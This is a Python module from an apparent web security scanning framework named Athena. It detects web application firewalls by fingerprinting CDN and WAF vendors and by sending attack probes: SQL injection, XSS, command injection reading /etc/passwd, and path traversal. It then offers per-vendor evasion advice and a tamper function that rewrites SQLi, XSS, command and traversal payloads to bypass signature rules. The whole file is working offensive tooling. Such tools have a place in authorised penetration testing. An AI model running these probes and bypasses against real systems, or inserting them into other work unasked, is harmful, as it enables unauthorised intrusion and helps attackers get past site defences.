"""WAF detection and evasion support for Athena.

Detects the presence of a Web Application Firewall / reverse-proxy CDN using
header/cookie/body fingerprints plus active challenge probes, then provides
payload tamper transforms that help bypass signature-based rules.
"""

import asyncio
import aiohttp
import logging
import random
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin

from modules.framework_config import FrameworkConfig

logger = logging.getLogger(__name__)


@dataclass
class WAFReport:
    """Result of a WAF detection pass."""
    detected: bool = False
    waf_name: str = ""
    confidence: float = 0.0
    matched_signatures: List[str] = field(default_factory=list)
    challenge_blocked: bool = False
    challenge_status: Optional[int] = None
    detail: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "detected": self.detected,
            "waf_name": self.waf_name,
            "confidence": self.confidence,
            "matched_signatures": list(self.matched_signatures),
            "challenge_blocked": self.challenge_blocked,
            "challenge_status": self.challenge_status,
            "detail": self.detail,
        }


class WAFDetector:
    """Detects WAF/CDN presence via fingerprints and active probes.

    Passive: response headers, cookies and body markers are matched against
    known signatures.  Active: probe requests carrying obvious attack payloads
    are sent - a WAF commonly answers with 403/406/429/503 or a block page
    where the application would normally return 200.
    """

    # (kind, signature, waf_name, confidence)
    # kind: 'header', 'cookie', 'body'
    FINGERPRINTS = [
        ('header', 'server: cloudflare', 'Cloudflare', 4),
        ('header', 'cf-ray', 'Cloudflare', 3),
        ('header', 'cf-cache-status', 'Cloudflare', 3),
        ('cookie', '__cfduid', 'Cloudflare', 4),
        ('cookie', 'cf_clearance', 'Cloudflare', 5),
        ('body', 'cf-error-details', 'Cloudflare', 4),
        ('header', 'server: akamaighost', 'Akamai', 4),
        ('header', 'x-akamai-transformed', 'Akamai', 3),
        ('body', '_akamai_challenge', 'Akamai', 4),
        ('header', 'server: awselb/2.0', 'AWS ELB', 3),
        ('header', 'server: amazon s3', 'AWS', 3),
        ('header', 'x-amz-waf', 'AWS WAF', 4),
        ('header', 'x-amzn-requestid', 'AWS', 2),
        ('body', 'mod_security', 'ModSecurity', 5),
        ('header', 'server: mod_security', 'ModSecurity', 5),
        ('body', 'modsecurity', 'ModSecurity', 4),
        ('body', 'mod_security message', 'ModSecurity', 5),
        ('body', 'access denied by security policy', 'ModSecurity', 4),
        ('header', 'server: nginx', 'nginx (possible ModSecurity)', 1),
        ('body', 'error 403: forbidden', 'Generic WAF', 2),
        ('header', 'x-sucuri-id', 'Sucuri', 4),
        ('header', 'x-sucuri-cache', 'Sucuri', 3),
        ('body', 'sucuri cloudproxy', 'Sucuri', 5),
        ('body', 'cloudproxy@sucuri.net', 'Sucuri', 5),
        ('cookie', 'incap_ses_', 'Incapsula', 5),
        ('cookie', 'visid_incap_', 'Incapsula', 5),
        ('header', 'x-cdn: incapsula', 'Incapsula', 4),
        ('body', 'incapsula incident id', 'Incapsula', 5),
        ('cookie', 'ns_', 'Incapsula', 3),
        ('header', 'server: imperva', 'Imperva', 4),
        ('header', 'x-cnection', 'Imperva', 3),
        ('cookie', 'visid_incap', 'Imperva', 3),
        ('header', 'server: bigip', 'F5 BIG-IP', 4),
        ('header', 'x-cnection: close', 'F5 BIG-IP', 3),
        ('cookie', 'bigipserver', 'F5 BIG-IP', 3),
        ('body', 'the requested url was rejected. please consult with your administrator', 'F5 BIG-IP', 5),
        ('header', 'server: fortiedr', 'FortiWeb', 4),
        ('body', 'fortiweb security', 'FortiWeb', 4),
        ('cookie', 'fortiwafsid', 'FortiWeb', 5),
        ('header', 'server: barracuda', 'Barracuda', 4),
        ('cookie', 'barra_counter_session', 'Barracuda', 3),
        ('body', 'barracuda network', 'Barracuda', 3),
        ('header', 'server: aspa', 'Comodo cWatch', 4),
        ('header', 'server: codian', 'Comodo cWatch', 4),
        ('header', 'server: cdnns', 'Comodo cWatch', 4),
        ('cookie', 'cwh', 'Comodo cWatch', 3),
        ('body', 'access denied by cwatch', 'Comodo cWatch', 4),
        ('header', 'x-denied-reason', 'Generic WAF', 3),
        ('header', 'x-waf', 'Generic WAF', 3),
        ('header', 'x-aspnet-version', 'Microsoft IIS', 2),
        ('header', 'server: microsoft-iis', 'Microsoft IIS', 2),
        ('body', 'this request has been blocked by the security', 'Generic WAF', 3),
        ('body', 'blocked by the web application firewall', 'Generic WAF', 4),
        ('body', 'request blocked', 'Generic WAF', 3),
        ('body', 'please enable cookies and reload the page', 'Generic WAF', 2),
        ('header', 'server: safeline', 'SafeLine', 4),
        ('body', 'safeline.acc.qq.com', 'SafeLine (Tencent)', 4),
        ('body', 'x-safeline', 'SafeLine', 3),
        ('header', 'server: yundun', 'Alibaba Yundun', 4),
        ('cookie', 'yundun', 'Alibaba Yundun', 3),
        ('header', 'server: weserv', 'Weserv', 2),
        ('body', 'qcloud waf', 'Tencent Cloud WAF', 4),
        ('header', 'server: qcloud', 'Tencent Cloud', 3),
        ('header', 'server: nsfocus', 'NSFOCUS', 4),
        ('body', 'nsfocus web application firewall', 'NSFOCUS', 5),
        ('header', 'server: sqli', '360 Web Application Firewall', 4),
        ('body', '360wzws', '360 WAF', 4),
        ('header', 'server: daxian', 'Baidu Yunjiasu', 4),
        ('body', 'yunjiasu', 'Baidu Yunjiasu', 3),
        ('header', 'server: veilox', 'SiteGround', 3),
        ('cookie', 'sgfpc', 'SiteGround', 3),
        ('header', 'x-powered-by-anquanbao', 'Anquanbao', 4),
        ('header', 'server: anquanbao', 'Anquanbao', 4),
        ('header', 'server: wts', 'Wordfence', 3),
        ('cookie', 'wfvt_', 'Wordfence', 4),
        ('cookie', 'wordfence_verifiedhuman', 'Wordfence', 5),
        ('body', 'wordfence', 'Wordfence', 4),
        ('header', 'x-dotdefender', 'dotDefender', 4),
        ('body', 'dotdefender blocked', 'dotDefender', 4),
        ('header', 'server: arvancloud', 'ArvanCloud', 4),
        ('cookie', 'arvancloud', 'ArvanCloud', 3),
        ('header', 'server: stackpath', 'StackPath', 3),
        ('header', 'server: fastly', 'Fastly', 3),
        ('cookie', 'fastly', 'Fastly', 3),
        ('header', 'server: varnish', 'Varnish', 2),
        ('header', 'x-varnish', 'Varnish', 2),
        ('header', 'server: openresty', 'OpenResty', 2),
    ]

    # Challenge probes: (param_url_suffix, description)
    CHALLENGES = [
        ("?id=1'%20OR%20'1'%3D'1", 'SQLi probe'),
        ("?q=<script>alert(1)</script>", 'XSS probe'),
        ("?cmd=%3Bcat%20/etc/passwd", 'CMDi probe'),
        ("?file=../../../../etc/passwd", 'LFI probe'),
    ]

    BLOCK_STATUSES = (403, 406, 429, 502, 503, 419)
    BLOCK_BODY_MARKERS = (
        'access denied', 'blocked', 'challenge', 'captcha', 'verification',
        'security check', 'your request has been blocked', 'anti-bot',
        'attack detected', 'suspicious activity', 'not a robot', 'denied',
    )

    def __init__(self, session: Optional[aiohttp.ClientSession] = None,
                 proxy: Optional[str] = None) -> None:
        self._session = session
        self._proxy = proxy
        self._close_session = session is None

    async def _get_session(self) -> aiohttp.ClientSession:
        if self._session is None or self._session.closed:
            conn = aiohttp.TCPConnector(ssl=False)
            self._session = aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=10),
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept-Language': 'en-US,en;q=0.9',
                }
            )
            self._close_session = True
        return self._session

    async def close(self) -> None:
        if self._close_session and self._session and not self._session.closed:
            await self._session.close()

    async def _probe(self, url: str) -> Optional[aiohttp.ClientResponse]:
        kwargs: Dict[str, Any] = dict(ssl=False, timeout=aiohttp.ClientTimeout(total=8))
        if self._proxy:
            kwargs['proxy'] = self._proxy
        session = await self._get_session()
        try:
            return await session.get(url, **kwargs)
        except Exception as exc:  # nosec B110
            logger.debug(f"WAF probe failed for {url}: {exc}")
            return None

    async def detect(self, target: str) -> WAFReport:
        """Run passive fingerprinting + active challenge probes."""
        report = WAFReport()
        base = target.rstrip('/')

        # --- Passive fingerprints on the base page --------------------------
        try:
            resp = await self._probe(base)
            if resp is None:
                return report
            headers = dict(resp.headers)
            headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
            headers_flat_lower = ' '.join(f"{k}: {v}".lower() for k, v in headers.items())
            body = ''
            if resp.status == 200:
                body = (await resp.text())[:8000].lower()
            if resp.status == 429 or resp.status in self.BLOCK_STATUSES:
                report.detail = f"Base page answered HTTP {resp.status}"
            for cookie in resp.cookies.values():
                headers_lower.setdefault('cookie', '')
                headers_lower['cookie'] += '; ' + str(cookie.key) + '=' + str(cookie.value)

            for kind, sig, waf_name, conf in self.FINGERPRINTS:
                if report.waf_name and conf < report.confidence:
                    continue
                if kind == 'header' and sig in headers_flat_lower:
                    report.matched_signatures.append(f"{kind}:{sig}")
                    report.waf_name, report.confidence = waf_name, max(report.confidence, conf)
                elif kind == 'cookie' and sig.lower() in headers_lower.get('cookie', ''):
                    report.matched_signatures.append(f"{kind}:{sig}")
                    report.waf_name, report.confidence = waf_name, max(report.confidence, conf)
                elif kind == 'body' and sig in body:
                    report.matched_signatures.append(f"{kind}:{sig}")
                    report.waf_name, report.confidence = waf_name, max(report.confidence, conf)
        except Exception as exc:  # nosec B110
            logger.debug(f"WAF passive detection failed: {exc}")

        # --- Active challenge probes ----------------------------------------
        blocked = 0
        for suffix, desc in self.CHALLENGES:
            probe_url = urljoin(base, '/' + suffix.lstrip('/'))
            try:
                resp = await self._probe(probe_url)
                if resp is None:
                    continue
                status = resp.status
                if status in self.BLOCK_STATUSES:
                    blocked += 1
                    if report.challenge_status is None:
                        report.challenge_status = status
                    report.challenge_blocked = True
                    continue
                if status == 200:
                    body = (await resp.text())[:3000].lower()
                    if any(marker in body for marker in self.BLOCK_BODY_MARKERS):
                        blocked += 1
                        report.challenge_blocked = True
            except Exception as exc:  # nosec B110
                logger.debug(f"WAF challenge {desc} failed: {exc}")

        if blocked >= 2:
            report.detected = True
            if not report.waf_name:
                report.waf_name = 'Unknown WAF (active blocking)'
            report.confidence = max(report.confidence, 0.6 + blocked * 0.1)
        elif blocked == 1:
            report.detected = True
            report.confidence = max(report.confidence, 0.4)
            if not report.waf_name:
                report.waf_name = 'Possible WAF (partial blocking)'
        elif report.waf_name and report.confidence >= 3:
            # High-confidence passive fingerprint only; weak generics like
            # 'server: nginx' (confidence 1-2) are infra, not a WAF.
            report.detected = True
            report.confidence = max(report.confidence, 0.5)
        if report.detected and not report.detail:
            report.detail = f"Blocked {blocked}/{len(self.CHALLENGES)} challenge probes"

        return report

    @staticmethod
    def evasion_advice(waf_name: str) -> List[str]:
        """Return evasion techniques applicable to a detected WAF."""
        advice = {
            'Cloudflare': [
                'Access the origin IP directly (bypass DNS/CDN)',
                'Use encoded payloads and normalized headers (X-Forwarded-For)',
                'Deliver payloads via JSON/XML body instead of GET params',
                'Pad payloads with benign characters to break signatures',
            ],
            'ModSecurity': [
                'Use comment injection: UN/**/ION SEL/**/ECT',
                'Use MySQL versioned comments: /*!50000UNION*/ /*!50000SELECT*/',
                'Split keywords: UNIunionON SELselectECT (recursive filtering)',
                'Use hex encoding for strings: 0x61dmin',
            ],
            'Imperva': [
                'Use null-byte and newline tricks: %00, %0a',
                'Obfuscate with case mutation and double URL encoding',
                'Send payloads with unusual Content-Type encodings',
            ],
            'F5 BIG-IP': [
                'Use HTTP parameter pollution (HPP): id=1&id=2',
                'Fragment payloads across many small requests',
                'Use chunked transfer encoding to bypass inspection',
            ],
            'Incapsula': [
                'Obtain valid visitor cookies (solve JS challenge) before scanning',
                'Use IPv6 origin access if available',
                'Rotate User-Agent to match real browser fingerprints',
            ],
            'Sucuri': [
                'Use HTML entity encoding for XSS payloads',
                'Use Unicode normalization: %ef%bc%bc for backslash',
                'Exploit via XML/JSON endpoints that are not inspected',
            ],
        }
        for key, techniques in advice.items():
            if key.lower() in waf_name.lower():
                return techniques
        return [
            'Encode payloads (URL, double-URL, Unicode, hex)',
            'Use comment injection and case mutation',
            'Split keywords with recursive concatenation',
            'Send payloads through POST body instead of URL params',
            'Use oversized requests / chunked encoding',
        ]

    # ------------------------------------------------------------------
    # Payload tamper transforms for signature-based WAF bypass
    # ------------------------------------------------------------------

    @staticmethod
    def tamper(payload: str, vuln_type: str, limit: int = 2) -> List[str]:
        """Generate deterministic bypass variants of a payload.

        Returns up to ``limit`` variants.  Only useful when a WAF is present.
        """
        if not payload:
            return []
        variants: List[str] = []
        seen = {payload}
        transforms = {
            'sql': [
                lambda p: p.replace(' ', '/**/'),
                lambda p: p.replace(' ', '%09'),
                lambda p: p.replace('UNION', 'UN/**/ION').replace('SELECT', 'SEL/**/ECT'),
                lambda p: p.replace('UNION', '/*!50000UNION*/').replace('SELECT', '/*!50000SELECT*/'),
                lambda p: p.replace('OR', 'OR/**/'),
                lambda p: p.replace("'", "%27"),
            ],
            'xss': [
                lambda p: p.replace('<script', '<scr<script>ipt'),
                lambda p: p.replace('<', '%3c').replace('>', '%3e'),
                lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
                lambda p: p.replace('alert', 'al\\x65rt'),
                lambda p: p.replace('(', '\\(').replace(')', '\\)'),
            ],
            'cmd': [
                lambda p: p.replace(' ', '${IFS}'),
                lambda p: p.replace(' ', '%09'),
                lambda p: p.replace('cat', 'c\\at').replace('ls', 'l\\s'),
                lambda p: p.replace(';', '%0a').replace('|', '%7c'),
                lambda p: p.replace(' ', '{IFS}'),
            ],
            'traversal': [
                lambda p: p.replace('../', '..%2f'),
                lambda p: p.replace('../', '..%252f'),
                lambda p: p.replace('../', '..\\'),
                lambda p: p.replace('../', '....//'),
                lambda p: p.replace('../', '%2e%2e%2f'),
            ],
        }
        funcs = transforms.get(vuln_type, [])
        for fn in funcs:
            if len(variants) >= limit:
                break
            try:
                v = fn(payload)
                if v and v != payload and v not in seen:
                    seen.add(v)
                    variants.append(v)
            except Exception:  # nosec B110
                continue
        random.shuffle(variants)
        return variants
